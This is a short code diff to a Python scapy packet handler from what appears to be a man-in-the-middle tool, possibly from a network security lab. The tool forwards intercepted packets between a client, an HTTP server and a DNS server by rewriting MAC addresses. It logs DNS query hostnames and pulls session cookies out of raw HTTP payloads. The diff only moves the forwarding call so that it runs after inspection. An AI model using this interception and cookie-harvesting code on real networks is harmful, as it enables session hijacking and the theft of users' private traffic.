@@ -64,7 +64,6 @@ def handle_packet(p):
         if p[IP].dst == httpServerIP: p[Ether].dst = httpServerMAC
         if p[IP].dst == dnsServerIP: p[Ether].dst = dnsServerMAC
         if p[IP].dst == clientIP: p[Ether].dst = clientMAC
-        sendp(p, iface=conf.iface)
         if DNS in p:
             if p[DNS].an is None:
                 print(f'*hostname:{p[DNS].qd.qname.decode("utf-8")}')
@@ -79,6 +78,7 @@ def handle_packet(p):
                 cookie = find_cookie(p[Raw].load)
                 if cookie is not None:
                     print(f'*cookie:{cookie}')
+        sendp(p, iface=conf.iface)
     except Exception as e:
         debug(f'Error when sniffing: {e}')
 
